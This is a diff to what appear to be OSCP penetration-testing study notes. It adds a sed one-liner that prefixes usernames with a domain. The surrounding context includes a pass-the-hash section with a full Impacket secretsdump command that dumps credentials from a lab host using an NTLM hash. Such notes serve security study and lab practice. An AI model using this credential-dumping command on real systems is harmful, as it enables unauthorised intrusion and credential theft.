@@ -374,6 +374,10 @@ If you have path traversal plus a location with write access you can exploit tha
 - get client IPs from apache access.log and group them:  
   `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`  
 
+## Creating lists
+- add domain name to the beginning of each user in a users.txt file:  
+  `# sed -e 's/^/THINC\\/' /root/Desktop/OSCP/usernames.txt > /root/Desktop/OSCP/domainusers.txt`  
+
 ## Pass-the-Hash techniques
 - Dump creds with Impacket:  
   `secretsdump.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
